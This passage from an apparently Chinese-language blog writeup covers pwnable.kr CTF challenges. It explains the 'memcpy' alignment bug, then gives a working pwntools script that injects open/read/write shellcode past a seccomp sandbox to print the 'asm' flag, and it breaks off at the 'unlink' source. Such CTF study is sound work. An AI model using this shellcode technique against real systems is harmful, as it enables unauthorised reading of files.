class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title function_">rdtsc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">asm</span>(<span class="string">&quot;rdtsc&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">slow_memcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src, <span class="type">size_t</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;len; i++) &#123;</span><br><span class="line">        dest[i] = src[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">fast_memcpy</span><span class="params">(<span class="type">char</span>* dest, <span class="type">const</span> <span class="type">char</span>* src, <span class="type">size_t</span> len)</span>&#123;</span><br><span class="line">    <span class="type">size_t</span> i;</span><br><span class="line">    <span class="comment">// 64-byte block fast copy</span></span><br><span class="line">    <span class="keyword">if</span>(len &gt;= <span class="number">64</span>)&#123;</span><br><span class="line">        i = len / <span class="number">64</span>;</span><br><span class="line">        len &amp;= (<span class="number">64</span><span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">while</span>(i-- &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            __asm__ __volatile__ (</span><br><span class="line">            <span class="string">&quot;movdqa (%0), %%xmm0\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movdqa 16(%0), %%xmm1\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movdqa 32(%0), %%xmm2\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movdqa 48(%0), %%xmm3\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %%xmm0, (%1)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %%xmm1, 16(%1)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %%xmm2, 32(%1)\n&quot;</span></span><br><span class="line">            <span class="string">&quot;movntps %%xmm3, 48(%1)\n&quot;</span></span><br><span class="line">            ::<span class="string">&quot;r&quot;</span>(src),<span class="string">&quot;r&quot;</span>(dest):<span class="string">&quot;memory&quot;</span>);</span><br><span class="line">            dest += <span class="number">64</span>;</span><br><span class="line">            src += <span class="number">64</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// byte-to-byte slow copy</span></span><br><span class="line">    <span class="keyword">if</span>(len) slow_memcpy(dest, src, len);</span><br><span class="line">    <span class="keyword">return</span> dest;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hey, I have a boring assignment for CS class.. :(\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The assignment is simple.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- What is the best implementation of memcpy?        -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- 1. implement your own slow/fast version of memcpy -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- 2. compare them with various size of data         -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;- 3. conclude your experiment and submit report     -\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------------------------\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This time, just help me out with my experiment and get flag\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;No fancy hacking, I promise :D\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> t1, t2;</span><br><span class="line">    <span class="type">int</span> e;</span><br><span class="line">    <span class="type">char</span>* src;</span><br><span class="line">    <span class="type">char</span>* dest;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> low, high;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line">    <span class="comment">// allocate memory</span></span><br><span class="line">    <span class="type">char</span>* cache1 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="type">char</span>* cache2 = mmap(<span class="number">0</span>, <span class="number">0x4000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    src = mmap(<span class="number">0</span>, <span class="number">0x2000</span>, <span class="number">7</span>, MAP_PRIVATE|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> sizes[<span class="number">10</span>];</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// setup experiment parameters</span></span><br><span class="line">    <span class="keyword">for</span>(e=<span class="number">4</span>; e&lt;<span class="number">14</span>; e++)&#123;    <span class="comment">// 2^13 = 8K</span></span><br><span class="line">        low = <span class="built_in">pow</span>(<span class="number">2</span>,e<span class="number">-1</span>);</span><br><span class="line">        high = <span class="built_in">pow</span>(<span class="number">2</span>,e);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;specify the memcpy amount between %d ~ %d : &quot;</span>, low, high);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span>(size &lt; low || size &gt; high)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;don&#x27;t mess with the experiment.\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        sizes[i++] = size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;ok, lets run the experiment with your configuration\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// run experiment</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)&#123;</span><br><span class="line">        size = sizes[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;experiment %d : memcpy with buffer size %d\n&quot;</span>, i+<span class="number">1</span>, size);</span><br><span class="line">        dest = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);        <span class="comment">// to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc();</span><br><span class="line">        slow_memcpy(dest, src, size);        <span class="comment">// byte-to-byte memcpy</span></span><br><span class="line">        t2 = rdtsc();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for slow_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memcpy</span>(cache1, cache2, <span class="number">0x4000</span>);        <span class="comment">// to eliminate cache effect</span></span><br><span class="line">        t1 = rdtsc();</span><br><span class="line">        fast_memcpy(dest, src, size);        <span class="comment">// block-to-block memcpy</span></span><br><span class="line">        t2 = rdtsc();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ellapsed CPU cycles for fast_memcpy : %llu\n&quot;</span>, t2-t1);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;thanks for helping my experiment!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag : ----- erased in this source code -----\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>源码实现了两种不同的 memcpy，要求我们帮忙测试一下，需要我们输入 10 个 size，这 10 个 size 的范围如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">8</span> <span class="number">16</span></span><br><span class="line"><span class="number">16</span> <span class="number">32</span></span><br><span class="line"><span class="number">32</span> <span class="number">64</span></span><br><span class="line"><span class="number">64</span> <span class="number">128</span></span><br><span class="line"><span class="number">128</span> <span class="number">256</span></span><br><span class="line"><span class="number">256</span> <span class="number">512</span></span><br><span class="line"><span class="number">512</span> <span class="number">1024</span></span><br><span class="line"><span class="number">1024</span> <span class="number">2048</span></span><br><span class="line"><span class="number">2048</span> <span class="number">4096</span></span><br><span class="line"><span class="number">4096</span> <span class="number">8192</span></span><br></pre></td></tr></table></figure><p>10 个 size，一共进行 10 次测试，每次测试分别使用 slow_memcpy 和 fast_memcpy 拷贝 size 大小的内存到 malloc 出来的一块 size 大小的 dest 里，只要我们能把这 10 次测试都做完，就能拿到 flag，理论上 size 越小，测试越快，那我们先试一试用范围内最小的 size，<code>8 16 32 64 128 256 512 1024 2048 4096</code>，但是只能进行 4 次半测试就退出了，表示程序执行第 5 次测试的 fast_memcpy 的时候出现了问题。</p><p><img src="/2021/08/11/Pwnable.KR-Writeup-of-Toddler's-Bottle/16.png"></p><p>slow_memcpy 非常简单，直接用数组一个元素一个元素的赋值，而 fast_memcpy 则是在汇编层面上用 movdqa 和 movntps 以 64 字节为一块的单位拷贝，先看一下 movdqa 和 movntps 这两个指令都是在干什么。</p><blockquote><p>movdqa:</p><p>Moves 128, 256 or 512 bits of packed doubleword/quadword integer values from the source operand (the second operand) to the destination operand (the first operand). This instruction can be used to load a vector register from an int32/int64 memory location, to store the contents of a vector register into an int32/int64 memory location, or to move data between two ZMM registers. When the source or destination operand is a memory operand, the operand must be aligned on a 16 (EVEX.128)/32(EVEX.256)/64(EVEX.512)-byte boundary or a general-protection exception (#GP) will be generated. To move integer data to and from unaligned memory locations, use the VMOVDQU instruction.</p><p>movntps:</p><p>Moves the packed single-precision floating-point values in the source operand (second operand) to the destination operand (first operand) using a non-temporal hint to prevent caching of the data during the write to memory. The source operand is an XMM register, YMM register or ZMM register, which is assumed to contain packed single-precision, floating-pointing. The destination operand is a 128-bit, 256-bit or 512-bit memory location. The memory operand must be aligned on a 16-byte (128-bit version), 32-byte (VEX.256 encoded version) or 64-byte (EVEX.512 encoded version) boundary otherwise a general-protection exception (#GP) will be generated.</p></blockquote><p>movdqa 可以从 src 移动 16 字节，32 字节或 64 字节的打包的双字或四字整数到 dst，当 src 是一个来自内存中的数据时，该数据必须以 16 字节，32 字节或 64 字节对齐。movntps 可以从 src 移动打包的单精度浮点数到 dst，当 src 或 dst 是一个内存中的数据时，需要以 16 字节，32 字节或 64 字节对齐。在 fast_memcpy 中，若要拷贝的大小超过 64 字节时，使用 movdqa 将一个 64 字节来自内存的块数据分别移动 16 字节到 4 个寄存器中，然后使用 movntps 从这 4 个寄存器中每次移动 16 字节到目标内存中，因此，src 和 dst 在内存中必须以 16 字节对齐。</p><p>源码里直接给了编译命令 <code>gcc -o memcpy memcpy.c -m32 -lm</code>，本地手动编译，输入刚才的数据执行，发现没有任何问题。最后实在无奈看了网上别人的 writeup，这个程序的主要问题在于内存对齐，movdqa 和 movntps 都要求内存数据 16 字节对齐，而在编译命令中指明这是 32 位的程序，默认 8 字节对齐，因此在使用 fast_memcpy 的时候，malloc 出来的 chunk 的<strong> 内存位置</strong>（注意不是 chunk 的 size）并不是 16 字节对齐，所以我们就需要从 size 为 64 字节开始，手动加上 8 调整内存中的 chunk 为 16 字节对齐，最后的 size 为<code>8 16 32 72 136 264 520 1032 2056 4096</code>。至于为什么本地编译 32 位程序执行没有出错，目前尚不清楚。</p><h1 id="asm-6-pt"><a href="#asm-6-pt" class="headerlink" title="asm (6 pt)"></a>asm (6 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 128</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span>&#123;</span><br><span class="line">    scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(open), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(read), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(<span class="built_in">exit</span>), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (seccomp_load(ctx) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        seccomp_release(ctx);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;seccomp error\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    seccomp_release(ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> stub[] = <span class="string">&quot;\x48\x31\xc0\x48\x31\xdb\x48\x31\xc9\x48\x31\xd2\x48\x31\xf6\x48\x31\xff\x48\x31\xed\x4d\x31\xc0\x4d\x31\xc9\x4d\x31\xd2\x4d\x31\xdb\x4d\x31\xe4\x4d\x31\xed\x4d\x31\xf6\x4d\x31\xff&quot;</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> filter[<span class="number">256</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, _IOLBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to shellcoding practice challenge.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;In this challenge, you can run your x64 shellcode under SECCOMP sandbox.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Try to make shellcode that spits flag using open()/read()/write() systemcalls only.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;If this does not challenge you. you should play &#x27;asg&#x27; challenge :)\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span>* sh = (<span class="type">char</span>*)mmap(<span class="number">0x41414000</span>, <span class="number">0x1000</span>, <span class="number">7</span>, MAP_ANONYMOUS | MAP_FIXED | MAP_PRIVATE, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(sh, <span class="number">0x90</span>, <span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(sh, stub, <span class="built_in">strlen</span>(stub));</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> offset = <span class="keyword">sizeof</span>(stub);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;give me your x64 shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, sh+offset, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">    alarm(<span class="number">10</span>);</span><br><span class="line">    chroot(<span class="string">&quot;/home/asm_pwn&quot;</span>);    <span class="comment">// you are in chroot jail. so you can&#x27;t use symlink in /tmp</span></span><br><span class="line">    sandbox();</span><br><span class="line">    ((<span class="type">void</span> (*)(<span class="type">void</span>))sh)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又是一个 orw 沙箱，只能用 open，read 和 write 系统写一段 shellcode 读 flag，但是 flag 文件名特别长<code>this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong</code>，而且还会强制在 shellcode 之前加入一段 stub 清空 rip 和 rsp 以外的所有寄存器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x41414000:    xor    rax,rax</span><br><span class="line">0x41414003:    xor    rbx,rbx</span><br><span class="line">0x41414006:    xor    rcx,rcx</span><br><span class="line">0x41414009:    xor    rdx,rdx</span><br><span class="line">0x4141400c:    xor    rsi,rsi</span><br><span class="line">0x4141400f:    xor    rdi,rdi</span><br><span class="line">0x41414012:    xor    rbp,rbp</span><br><span class="line">0x41414015:    xor    r8,r8</span><br><span class="line">0x41414018:    xor    r9,r9</span><br><span class="line">0x4141401b:    xor    r10,r10</span><br><span class="line">0x4141401e:    xor    r11,r11</span><br><span class="line">0x41414021:    xor    r12,r12</span><br><span class="line">0x41414024:    xor    r13,r13</span><br><span class="line">0x41414027:    xor    r14,r14</span><br><span class="line">0x4141402a:    xor    r15,r15</span><br></pre></td></tr></table></figure><p>首先 esp 没被清空，所以我们可以用栈保存 flag 的文件名，然后用 open 系统调用拿到文件的 fd，之后用 read 通过 fd 读取 flag 到栈上，最后用 write 系统调用把栈上的 flag 打印出来，最终的 exp 如下。最开始的 <code>push rax</code> 是为了截断栈上的 flag 文件名，之后利用 rax 和 push 将 flag 文件名放到栈里，需要注意的是在 mov 立即数的时候，若立即数长度小于 64 位，应该 mov 到对应长度的寄存器里，否则会出现坏字符，例如<code>mov rax,0x1</code>，这样 shellcode 就会出现<code>\x00</code>，应该使用<code>mov al,0x1</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> argv</span><br><span class="line">HOST = <span class="string">&#x27;pwnable.kr&#x27;</span></span><br><span class="line">PORT = <span class="number">9026</span></span><br><span class="line"></span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.update(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># context.update(log_level=&#x27;debug&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = <span class="literal">None</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc6_2.27-3ubuntu1.2_amd64.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./asm&quot;</span>)</span><br><span class="line">pg = cyclic_gen()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(argv) &gt; <span class="number">1</span>:</span><br><span class="line">    conn = remote(HOST, PORT)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    env = &#123;</span><br><span class="line">        <span class="string">&#x27;LD_PRELOAD&#x27;</span>: libc.path <span class="keyword">if</span> libc <span class="keyword">else</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    conn = process(elf.path, env=env)</span><br><span class="line"><span class="comment"># int open(const char * pathname, int flags, mode_t mode);</span></span><br><span class="line"><span class="comment"># #define O_RDONLY 00000000</span></span><br><span class="line"><span class="comment"># fd = open(&quot;/hom e/or w/// flag&quot;, O_RDONLY)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssize_t read(int fd, void * buf, size_t count);</span></span><br><span class="line"><span class="comment"># read(fd, buf, 20)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ssize_t write (int fd, const void * buf, size_t count);</span></span><br><span class="line"><span class="comment"># write(1, buf, 20)</span></span><br><span class="line">flag = <span class="string">&#x27;.////////this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">LEN = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) % LEN == <span class="number">0</span> </span><br><span class="line"></span><br><span class="line">flags = [f.encode(<span class="string">&#x27;hex&#x27;</span>) <span class="keyword">for</span> f <span class="keyword">in</span> (flag[i:i+LEN] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), LEN))]</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">push rax;</span></span><br><span class="line"><span class="string">%s;</span></span><br><span class="line"><span class="string">mov rdi,rsp;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0x2;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">xor rdi,rdi;</span></span><br><span class="line"><span class="string">mov dil,al;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">xor rdx,rdx;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">mov al,0x50;</span></span><br><span class="line"><span class="string">mov rdx,rax;</span></span><br><span class="line"><span class="string">xor rax,rax;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">mov dil,0x1;</span></span><br><span class="line"><span class="string">mov rsi,rsp;</span></span><br><span class="line"><span class="string">mov rdx,rax;</span></span><br><span class="line"><span class="string">mov al,0x1;</span></span><br><span class="line"><span class="string">syscall;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (<span class="string">&#x27;;\n&#x27;</span>.join(((<span class="string">&#x27;mov rax,0x%s;\npush rax&#x27;</span> % f) <span class="keyword">for</span> f <span class="keyword">in</span> flags))))</span><br><span class="line"><span class="keyword">assert</span> <span class="string">&#x27;\x00&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shellcode</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(shellcode) &lt;= <span class="number">1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">conn.sendafter(<span class="string">&#x27;give me your x64 shellcode: &#x27;</span>, shellcode)</span><br><span class="line">log.success(<span class="string">&#x27;Get flag: &#x27;</span> + conn.recvline())</span><br><span class="line"></span><br><span class="line">conn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="unlink-10-pt"><a href="#unlink-10-pt" class="headerlink" title="unlink (10 pt)"></a>unlink (10 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 